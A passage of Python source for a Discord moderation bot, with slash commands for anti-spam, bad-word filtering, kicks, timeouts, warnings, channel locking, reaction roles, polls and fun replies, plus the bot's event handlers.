@app_commands.default_permissions(administrator=True)
async def unignore_user_badword(interaction: discord.Interaction, user: discord.Member):
    guild_data = get_guild_data(interaction.guild_id)
    uid = str(user.id)
    if "ignored_users" in guild_data and uid in guild_data["ignored_users"]:
        guild_data["ignored_users"].remove(uid)
        save_data(bot_data)
        await interaction.response.send_message(f"{user.mention} no longer ignored", ephemeral=True)

# ────────────────────────────────────────────────
# Anti-Spam Command
# ────────────────────────────────────────────────
@tree.command(name="antispam", description="View or configure anti-spam")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(enabled="On/Off (optional)", messages="Max messages (optional)", seconds="Time window in seconds (optional)")
async def antispam(interaction: discord.Interaction, enabled: bool = None, messages: int = None, seconds: int = None):
    guild_data = get_guild_data(interaction.guild_id)
    updated = False
    if enabled is not None:
        guild_data["antispam_enabled"] = enabled
        updated = True
    if messages is not None:
        guild_data["antispam_messages"] = messages
        updated = True
    if seconds is not None:
        guild_data["antispam_seconds"] = seconds
        updated = True
    if updated:
        save_data(bot_data)
    status = "Enabled" if guild_data.get("antispam_enabled", True) else "Disabled"
    msgs = guild_data.get("antispam_messages", 5)
    secs = guild_data.get("antispam_seconds", 5)
    embed = discord.Embed(title="Anti-Spam Settings", color=0x5865F2)
    embed.add_field(name="Status", value=status, inline=True)
    embed.add_field(name="Limit", value=f"{msgs} messages in {secs} seconds", inline=True)
    embed.set_footer(text="Mutes for 5 min on detection • Bot")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ────────────────────────────────────────────────
# Ping Commands
# ────────────────────────────────────────────────
@tree.command(name="pingstart", description="Start pinging a user every 5 minutes in this channel")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(target="User to ping repeatedly", message="Optional custom message (default: just @user)")
async def pingstart(interaction: discord.Interaction, target: discord.Member, message: str = None):
    guild_id = interaction.guild_id
    user_id = target.id
    if guild_id not in ping_tasks:
        ping_tasks[guild_id] = {}
    if user_id in ping_tasks[guild_id]:
        ping_tasks[guild_id][user_id].cancel()
        del ping_tasks[guild_id][user_id]
    channel = interaction.channel
    async def ping_loop():
        while True:
            try:
                content = f"{message} {target.mention}" if message else target.mention
                await channel.send(content)
                await asyncio.sleep(300)
            except (discord.Forbidden, discord.HTTPException) as e:
                print(f"Ping loop failed {guild_id}/{channel.id}: {e}")
                break
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Ping loop error: {e}")
                await asyncio.sleep(60)
    task = bot.loop.create_task(ping_loop())
    ping_tasks[guild_id][user_id] = task
    await interaction.response.send_message(
        f"Started pinging {target.mention} every 5 min in {channel.mention}\n"
        f"Message: {message or 'just ping'}\nUse `/pingstop` to stop.",
        ephemeral=True
    )

@tree.command(name="pingstop", description="Stop pinging a user (or all in this server)")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(target="User to stop (leave blank = stop ALL)")
async def pingstop(interaction: discord.Interaction, target: discord.Member = None):
    guild_id = interaction.guild_id
    if guild_id not in ping_tasks or not ping_tasks[guild_id]:
        await interaction.response.send_message("No active pings here.", ephemeral=True)
        return
    if target is None:
        count = 0
        for uid, task in list(ping_tasks[guild_id].items()):
            task.cancel()
            count += 1
        ping_tasks[guild_id].clear()
        msg = f"Stopped **{count}** ping task(s)."
    else:
        user_id = target.id
        if user_id in ping_tasks[guild_id]:
            ping_tasks[guild_id][user_id].cancel()
            del ping_tasks[guild_id][user_id]
            msg = f"Stopped pinging {target.mention}."
        else:
            msg = f"{target.mention} is not being pinged."
    await interaction.response.send_message(msg, ephemeral=True)

# ────────────────────────────────────────────────
# Moderation Commands
# ────────────────────────────────────────────────
@tree.command(
    name="setup_mute_role",
    description="Create a permanent Muted role that silences users until the role is removed"
)
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    role_name="Name of the mute role (default: Muted)",
    color_hex="Hex color for the role (default: ffaa00 - orange)"
)
async def setup_mute_role(
    interaction: discord.Interaction,
    role_name: str = "Muted",
    color_hex: str = "ffaa00"
):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    try:
        mute_role = await guild.create_role(
            name=role_name,
            color=int(color_hex, 16),
            hoist=False,
            mentionable=False,
            reason=f"Permanent mute role created by {interaction.user}"
        )
    except discord.Forbidden:
        return await interaction.followup.send("❌ I don't have permission to create roles.", ephemeral=True)
    except Exception as e:
        return await interaction.followup.send(f"❌ Failed to create role: {e}", ephemeral=True)

    updated = 0
    failed = 0
    for channel in guild.channels:
        try:
            await channel.set_permissions(
                mute_role,
                send_messages=False,
                add_reactions=False,
                speak=False,
                stream=False,
                use_voice_activation=False,
                connect=False,
                reason="Permanent mute role setup"
            )
            updated += 1
        except discord.Forbidden:
            failed += 1
        except Exception as e:
            print(f"Failed on channel {channel.name}: {e}")
            failed += 1

    guild_data = get_guild_data(guild.id)
    guild_data["mute_role_id"] = mute_role.id
    save_data(bot_data)

    embed = discord.Embed(
        title="Permanent Mute Role Created",
        description=f"Role {mute_role.mention} is now set up.\n"
                    f"Anyone with this role is muted **forever** until you remove the role manually.",
        color=int(color_hex, 16)
    )
    embed.add_field(name="Channels updated", value=f"{updated}/{len(guild.channels)}", inline=True)
    embed.add_field(name="Failed channels", value=str(failed), inline=True)
    embed.add_field(
        name="How to use",
        value="• Give role: `/mute @user` (if you updated your mute command)\n"
              "• Remove mute: right-click user → Roles → remove Muted\n"
              "• Or use `/unmute @user` if you have it",
        inline=False
    )
    embed.set_footer(text="This is a permanent role-based mute — no timeout needed")
    await interaction.followup.send(embed=embed, ephemeral=False)

@tree.command(name="kick", description="Kick member")
@app_commands.default_permissions(kick_members=True)
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = None):
    try:
        if member.top_role >= interaction.guild.me.top_role or member.top_role >= interaction.user.top_role:
            await interaction.response.send_message("Cannot kick (hierarchy).", ephemeral=True)
            return
        await member.kick(reason=reason or "No reason")
        await interaction.response.send_message(f"Kicked {member.mention}", ephemeral=False)
        log_general_action(interaction.guild, "KICK", interaction.user, member, reason or "No reason")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permissions to kick.", ephemeral=True)

@tree.command(name="timeout", description="Mutes a user (Timeout + Role) with an embed response")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(time="Format: 1d, 10h, 30m, 15s (e.g., 1h30m)", reason="Reason for the mute")
async def mute(interaction: discord.Interaction, member: discord.Member, time: str, reason: str = "No reason provided"):
    await interaction.response.defer()
    duration = parse_timespan(time)
    if not duration:
        return await interaction.followup.send("❌ Invalid time format! Use `1d`, `1h`, `30m`, etc.")
    try:
        timeout_duration = duration if duration <= timedelta(days=28) else timedelta(days=28)
        await member.timeout(timeout_duration, reason=reason)
        guild_data = get_guild_data(interaction.guild_id)
        role_id = guild_data.get("mute_role_id")
        if role_id:
            mute_role = interaction.guild.get_role(int(role_id))
            if mute_role:
                await member.add_roles(mute_role, reason=reason)
        embed = discord.Embed(
            title="User Muted",
            color=0xffa500,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=interaction.guild.name, icon_url=interaction.guild.icon.url if interaction.guild.icon else None)
        embed.add_field(name="Target", value=f"{member.mention} ({member.id})", inline=False)
        embed.add_field(name="Duration", value=time, inline=True)
        embed.add_field(name="Moderator", value=interaction.user.mention, inline=True)
        embed.add_field(name="Reason", value=reason, inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Bot Moderation")
        await interaction.followup.send(embed=embed)
    except discord.Forbidden:
        await interaction.followup.send("❌ I don't have permission to mute this user. Check my role position!")
    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {e}")

@tree.command(name="unmute", description="Remove timeout from a user")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(member="User to unmute", reason="Reason (optional)")
async def unmute(interaction: discord.Interaction, member: discord.Member, reason: str = None):
    try:
        if member.top_role >= interaction.guild.me.top_role or member.top_role >= interaction.user.top_role:
            await interaction.response.send_message("Cannot unmute (hierarchy).", ephemeral=True)
            return
        await member.timeout(None, reason=reason or "No reason")
        await interaction.response.send_message(f"Unmuted {member.mention}", ephemeral=False)
        log_timeout_action(interaction.guild, interaction.user, member, None, reason, is_unmute=True)
    except discord.Forbidden:
        await interaction.response.send_message("Missing permissions to unmute.", ephemeral=True)

@tree.command(name="warn", description="Warn a user (logs + DM)")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(member="User to warn", reason="Reason (optional)")
async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = None):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data.setdefault("warnings", {})
    if str(member.id) not in guild_data["warnings"]:
        guild_data["warnings"][str(member.id)] = []
    warning = {"reason": reason or "No reason", "timestamp": datetime.utcnow().isoformat(), "by": str(interaction.user.id)}
    guild_data["warnings"][str(member.id)].append(warning)
    save_data(bot_data)
    count = len(guild_data["warnings"][str(member.id)])
    await interaction.response.send_message(f"{member.mention} warned (total: {count})", ephemeral=False)
    warn_history_log[interaction.guild_id].append({
        "target": member.name,
        "target_id": str(member.id),
        "warner": interaction.user.name,
        "warner_id": str(interaction.user.id),
        "reason": reason or "No reason",
        "timestamp": datetime.utcnow().isoformat()
    })
    if len(warn_history_log[interaction.guild_id]) > 50:
        warn_history_log[interaction.guild_id] = warn_history_log[interaction.guild_id][-50:]
    try:
        embed = discord.Embed(title="Warning Received", description=f"In **{interaction.guild.name}**", color=0xffaa00)
        embed.add_field(name="Reason", value=reason or "No reason", inline=False)
        embed.add_field(name="Total Warnings", value=count, inline=False)
        await member.send(embed=embed)
    except:
        await interaction.followup.send(f"Could not DM {member.mention}", ephemeral=True)
    log_warn_action(interaction.guild, interaction.user, member, reason)

@tree.command(name="view_join_role", description="See the current auto-join role")
@app_commands.default_permissions(administrator=True)
async def view_join_role(interaction: discord.Interaction):
    guild_data = get_guild_data(interaction.guild_id)
    role_id = guild_data.get("join_role_id")
    if role_id:
        role = interaction.guild.get_role(role_id)
        if role:
            await interaction.response.send_message(f"Current auto-join role: {role.mention}", ephemeral=True)
        else:
            await interaction.response.send_message("Role ID set but role not found.", ephemeral=True)
    else:
        await interaction.response.send_message("No auto-join role set yet.", ephemeral=True)

@tree.command(name="warn_history", description="View warning history")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(member="User to check")
async def warn_history(interaction: discord.Interaction, member: discord.Member):
    guild_data = get_guild_data(interaction.guild_id)
    warnings = guild_data.get("warnings", {}).get(str(member.id), [])
    if not warnings:
        await interaction.response.send_message(f"No warnings for {member.mention}", ephemeral=True)
        return
    embed = discord.Embed(title=f"Warnings for {member.name}", color=0xffaa00)
    embed.add_field(name="Total", value=len(warnings), inline=False)
    text = ""
    for i, w in enumerate(warnings, 1):
        by = interaction.guild.get_member(int(w["by"]))
        by_name = by.mention if by else f"ID {w['by']}"
        text += f"**#{i}** {w['timestamp'][:10]} by {by_name}\n{w['reason']}\n\n"
    embed.description = text[:2000]
    await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command(name="clear", description="Delete recent messages")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(amount="2–100 messages")
async def clear(interaction: discord.Interaction, amount: app_commands.Range[int, 2, 100]):
    await interaction.response.defer(ephemeral=False)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        count = len(deleted)
        msg = f"🧹 **{interaction.user.mention}** cleared **{count}** message{'s' if count != 1 else ''}."
        await interaction.edit_original_response(content=msg)
        await asyncio.sleep(6)
        await interaction.delete_original_response()
        log_general_action(interaction.guild, "CLEAR MESSAGES", interaction.user, None, f"{count} in {interaction.channel.mention}")
    except discord.Forbidden:
        await interaction.edit_original_response(content="Missing permissions to delete messages.")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error: {str(e)}")

# ────────────────────────────────────────────────
# Channel Management Commands
# ────────────────────────────────────────────────
@tree.command(name="lock", description="Lock current channel (deny @everyone sending messages)")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(reason="Optional reason")
async def lock(interaction: discord.Interaction, reason: str = "No reason provided"):
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Only works in text channels.", ephemeral=True)
        return
    everyone = interaction.guild.default_role
    try:
        await channel.set_permissions(
            everyone,
            send_messages=False,
            add_reactions=False,
            reason=f"Locked by {interaction.user} | {reason}"
        )
        await interaction.response.send_message(f"🔒 **{channel.mention}** locked.\nReason: {reason}")
        log_general_action(interaction.guild, "CHANNEL LOCKED", interaction.user, None, reason, f"Channel: {channel.mention}")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to manage channel.", ephemeral=True)

@tree.command(name="unlock", description="Unlock current channel")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(reason="Optional reason")
async def unlock(interaction: discord.Interaction, reason: str = "No reason provided"):
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Only works in text channels.", ephemeral=True)
        return
    everyone = interaction.guild.default_role
    try:
        await channel.set_permissions(
            everyone,
            send_messages=None,
            add_reactions=None,
            reason=f"Unlocked by {interaction.user} | {reason}"
        )
        await interaction.response.send_message(f"🔓 **{channel.mention}** unlocked.\nReason: {reason}")
        log_general_action(interaction.guild, "CHANNEL UNLOCKED", interaction.user, None, reason, f"Channel: {channel.mention}")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to manage channel.", ephemeral=True)

@tree.command(name="slowmode", description="Set slowmode delay on current channel")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(
    seconds="Delay in seconds (0–21600, 0 = disable)",
    reason="Optional reason"
)
async def slowmode(interaction: discord.Interaction, seconds: app_commands.Range[int, 0, 21600], reason: str = None):
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Only works in text channels.", ephemeral=True)
        return
    try:
        await channel.edit(slowmode_delay=seconds, reason=f"Slowmode set by {interaction.user} | {reason or 'No reason'}")
        status = f"**{seconds} seconds**" if seconds > 0 else "**disabled**"
        await interaction.response.send_message(f"⏱️ Slowmode set to {status} in {channel.mention}")
        log_general_action(interaction.guild, "SLOWMODE CHANGED", interaction.user, None, reason or "No reason", f"Channel: {channel.mention} | {seconds}s")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to manage channel.", ephemeral=True)

@tree.command(name="hide", description="Hide current channel from @everyone")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(reason="Optional reason")
async def hide(interaction: discord.Interaction, reason: str = "No reason provided"):
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Only works in text channels.", ephemeral=True)
        return
    everyone = interaction.guild.default_role
    try:
        await channel.set_permissions(
            everyone,
            view_channel=False,
            reason=f"Hidden by {interaction.user} | {reason}"
        )
        await interaction.response.send_message(f"🕶️ **{channel.mention}** hidden.")
        log_general_action(interaction.guild, "CHANNEL HIDDEN", interaction.user, None, reason, f"Channel: {channel.mention}")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to manage channel.", ephemeral=True)

@tree.command(name="unhide", description="Make current channel visible to @everyone again")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(reason="Optional reason")
async def unhide(interaction: discord.Interaction, reason: str = "No reason provided"):
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Only works in text channels.", ephemeral=True)
        return
    everyone = interaction.guild.default_role
    try:
        await channel.set_permissions(
            everyone,
            view_channel=None,
            reason=f"Unhidden by {interaction.user} | {reason}"
        )
        await interaction.response.send_message(f"👀 **{channel.mention}** is visible again.")
        log_general_action(interaction.guild, "CHANNEL UNHIDDEN", interaction.user, None, reason, f"Channel: {channel.mention}")
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to manage channel.", ephemeral=True)

# ────────────────────────────────────────────────
# Fun & Utility Commands
# ────────────────────────────────────────────────
@tree.command(name="rr", description="Create reaction role panel")
@app_commands.default_permissions(administrator=True)
async def rr(interaction: discord.Interaction, channel: discord.TextChannel, emoji: str, role: discord.Role, title: str):
    embed = discord.Embed(color=0x5865F2, title=title, description=f"React with {emoji} → {role.mention}")
    msg = await channel.send(embed=embed)
    await msg.add_reaction(emoji)
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["rr"][str(msg.id)] = {emoji: role.id}
    save_data(bot_data)
    await interaction.response.send_message(f"Panel created (ID: {msg.id})", ephemeral=True)

@tree.command(name="poll", description="Create a poll")
async def poll(interaction: discord.Interaction, question: str, options: str):
    opts = [o.strip() for o in options.split(",")][:10]
    if len(opts) < 2:
        await interaction.response.send_message("Need at least 2 options", ephemeral=True)
        return
    embed = discord.Embed(title=question, color=0x00ff00)
    for i, o in enumerate(opts, 1):
        embed.add_field(name=f"Option {i}", value=o, inline=False)
    msg = await interaction.channel.send(embed=embed)
    for i in range(1, len(opts)+1):
        await msg.add_reaction(f"{i}\u20e3")
    await interaction.response.send_message("Poll created!", ephemeral=True)

@tree.command(name="set_starboard", description="Set starboard channel")
@app_commands.default_permissions(administrator=True)
async def set_starboard(interaction: discord.Interaction, channel: discord.TextChannel, threshold: int = 5):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["starboard_channel"] = channel.id
    guild_data["starboard_threshold"] = threshold
    save_data(bot_data)
    await interaction.response.send_message(f"Starboard: {channel.mention} @ {threshold} ⭐", ephemeral=True)

@tree.command(name="say", description="Make bot say something")
@app_commands.default_permissions(manage_messages=True)
async def say(interaction: discord.Interaction, message: str):
    await interaction.response.defer(thinking=True)
    await interaction.delete_original_response()
    await interaction.channel.send(message)


@tree.command(name="8ball", description="Ask the magic 8-ball")
async def eightball(interaction: discord.Interaction, question: str):
    answers = ["Yes – definitely.", "No"]
    await interaction.response.send_message(f"🎱 {question}\n**{random.choice(answers)}**")

@tree.command(name="coinflip", description="Flip a coin")
async def coinflip(interaction: discord.Interaction):
    result = random.choice(["Heads!", "Tails!"])
    await interaction.response.send_message(f"🪙 {result}")

@tree.command(name="dice", description="Roll dice (default 1d6)")
async def dice(interaction: discord.Interaction, dice: str = "1d6"):
    try:
        num, sides = map(int, dice.lower().split("d"))
        rolls = [random.randint(1, sides) for _ in range(num)]
        total = sum(rolls)
        await interaction.response.send_message(f"🎲 {dice.upper()} → {rolls} = **{total}**")
    except:
        await interaction.response.send_message("Use format like 2d6", ephemeral=True)

@tree.command(name="joke", description="Random joke")
async def joke(interaction: discord.Interaction):
    jokes = [
        "Why don't eggs tell jokes? They'd crack each other up.",
        "I told my computer I needed a break... now it won't stop sending KitKat ads.",
        "Why did the scarecrow win an award? Outstanding in his field!"
    ]
    await interaction.response.send_message(random.choice(jokes))

@tree.command(name="airoast", description="Savage roast")
@app_commands.describe(target="Who to roast (optional)")
async def airoast(interaction: discord.Interaction, target: discord.Member = None):
    v = target or interaction.user
    roasts = [
        f"{v.mention} has the personality of expired milk.",
        f"{v.name} is why the mute button exists."
    ]
    await interaction.response.send_message(random.choice(roasts))

@tree.command(name="aipickup", description="Cheesy pickup line")
@app_commands.describe(target="Who (optional)")
async def aipickup(interaction: discord.Interaction, target: discord.Member = None):
    t = target.mention if target else "you"
    lines = [
        f"Are you Wi-Fi? Because I'm feeling a connection with {t}.",
        f"Is your name Google? Because {t} has everything I've been searching for."
    ]
    await interaction.response.send_message(random.choice(lines))

# ────────────────────────────────────────────────
# Help Command – updated with new commands
# ────────────────────────────────────────────────
@tree.command(name="help", description="Show all commands")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(title="Bot Commands", color=0x5865F2)
    embed.add_field(name="Moderation & Setup", value=(
        "`/set_welcome` `/set_welcome_message` `/set_log` `/set_timeout_log` `/set_ban_log` `/set_warn_log` `/set_autorole_log` `/set_delete_log` `/log_settings` `/setupverify` `/set_join_role` `/view_join_role`"
        "`/kick` `/mute` `/unmute` `/warn` `/warn_history` `/clear` "
        "`/lock` `/unlock` `/slowmode` `/hide` `/unhide` "
        "`/userinfo` `/antispam` `/recent_bans` `/recent_warns` `/test_welcome` `/test_badword` `/set_join_role`"
    ), inline=False)
    embed.add_field(name="Bad Words", value=(
        "`/add_badword` `/remove_badword` `/badwords_list` `/badwords_clear` "
        "`/ignore_role_badword` `/ignore_user_badword` `/unignore_role_badword` `/unignore_user_badword`"
    ), inline=False)
    embed.add_field(name="Pings", value="`/pingstart` `/pingstop`", inline=False)
    embed.add_field(name="Fun & Utility", value=(
        "`/say` `/8ball` `/coinflip` `/dice` `/joke` "
        "`/airoast` `/aipickup` `/poll` `/set_starboard` `/rr`"
    ), inline=False)
    embed.set_footer(text="Bot • March 2026")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ────────────────────────────────────────────────
# Events – Verification, Reaction Roles, Starboard
# ────────────────────────────────────────────────
@bot.event
async def on_raw_reaction_add(payload):
    if payload.user_id == bot.user.id:
        return
    guild = bot.get_guild(payload.guild_id)
    if not guild:
        return
    guild_data = get_guild_data(payload.guild_id)
    mid = str(payload.message_id)
    verify = guild_data.get("verify", {})
    if verify.get("message_id") == payload.message_id and str(payload.emoji) == verify.get("emoji"):
        member = guild.get_member(payload.user_id)
        if member and not member.bot:
            add_role = guild.get_role(verify.get("role_id"))
            remove_role_id = verify.get("remove_role_id")
            remove_role = guild.get_role(remove_role_id) if remove_role_id else None
            if add_role:
                try:
                    await member.add_roles(add_role)
                    if remove_role and remove_role in member.roles:
                        await member.remove_roles(remove_role)
                    if verify.get("remove_after_verify", False):
                        channel = guild.get_channel(payload.channel_id)
                        msg = await channel.fetch_message(payload.message_id)
                        await msg.remove_reaction(payload.emoji, member)
                except discord.Forbidden:
                    pass
    if mid in guild_data.get("rr", {}):
        role_id = guild_data["rr"][mid].get(str(payload.emoji))
        if role_id:
            member = guild.get_member(payload.user_id)
            if member:
                role = guild.get_role(role_id)
                if role:
                    await member.add_roles(role)
                    channel = guild.get_channel(payload.channel_id)
                    msg = await channel.fetch_message(payload.message_id)
                    await msg.remove_reaction(payload.emoji, member)
    if str(payload.emoji) == "⭐":
        channel = guild.get_channel(payload.channel_id)
        msg = await channel.fetch_message(payload.message_id)
        count = sum(1 for r in msg.reactions if str(r.emoji) == "⭐")
        scid = guild_data.get("starboard_channel")
        thresh = guild_data.get("starboard_threshold", 5)
        if scid and count >= thresh:
            schan = guild.get_channel(scid)
            if schan:
                embed = discord.Embed(description=msg.content or "[Attachment]", color=0xFFD700)
                embed.set_author(name=str(msg.author))
                embed.add_field(name="Source", value=f"[Jump]({msg.jump_url})", inline=False)
                embed.set_footer(text=f"⭐ {count}")
                if msg.attachments:
                    embed.set_image(url=msg.attachments[0].url)
                await schan.send(embed=embed)

@bot.event
async def on_raw_reaction_remove(payload):
    if payload.user_id == bot.user.id:
        return
    guild = bot.get_guild(payload.guild_id)
    if not guild:
        return
    guild_data = get_guild_data(payload.guild_id)
    verify = guild_data.get("verify", {})
    if verify.get("message_id") == payload.message_id and str(payload.emoji) == verify.get("emoji"):
        member = guild.get_member(payload.user_id)
        if member and not member.bot:
            role = guild.get_role(verify.get("role_id"))
            if role:
                try:
                    await member.remove_roles(role)
                except discord.Forbidden:
                    pass

# ────────────────────────────────────────────────
# Other Events
# ────────────────────────────────────────────────
@bot.event
async def on_message_delete(message):
    if message.author.bot or not message.guild: return
    guild_data = get_guild_data(message.guild.id)
    cid = guild_data.get("delete_log_channel") or guild_data.get("log_channel")
    if cid:
        channel = message.guild.get_channel(cid)
        if channel:
            embed = discord.Embed(color=0xff0000, description=f"Deleted in {message.channel.mention}\n{message.content or '[No text]'}", timestamp=datetime.utcnow())
            embed.set_author(name=str(message.author))
            await channel.send(embed=embed)

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot or not message.guild:
        return
    guild_data = get_guild_data(message.guild.id)
    if str(message.author.id) in guild_data.get("ignored_users", []):
        return
    user_roles = {str(r.id) for r in message.author.roles}
    if user_roles & set(guild_data.get("ignored_roles", [])):
        return
    cl = message.content.lower()
    if any(w in cl for w in guild_data.get("badwords", [])):
        await message.delete()
        await message.channel.send(f"{message.author.mention}, language!", delete_after=6)
        return
    if guild_data.get("antispam_enabled", True):
        user_id = str(message.author.id)
        now = datetime.utcnow()
        tracker = spam_tracker[message.guild.id][user_id]
        while tracker and tracker[0] < now - timedelta(seconds=guild_data["antispam_seconds"]):
            tracker.popleft()
        tracker.append(now)
        if len(tracker) > guild_data["antispam_messages"]:
            try:
                await message.channel.purge(limit=15, check=lambda m: m.author.id == message.author.id and (now - m.created_at).total_seconds() < guild_data["antispam_seconds"] + 5)
            except:
                pass
            duration = now + timedelta(minutes=5)
            try:
                await message.author.timeout(duration, reason="Anti-spam violation")
                log_timeout_action(message.guild, bot.user, message.author, 5, "Auto", is_antispam=True)
            except discord.Forbidden:
                await message.channel.send(f"Anti-spam triggered for {message.author.mention}, missing perms.", delete_after=30)
            spam_tracker[message.guild.id][user_id].clear()
    await bot.process_commands(message)

# ────────────────────────────────────────────────
# Start the bot
# ────────────────────────────────────────────────
bot.run(TOKEN)
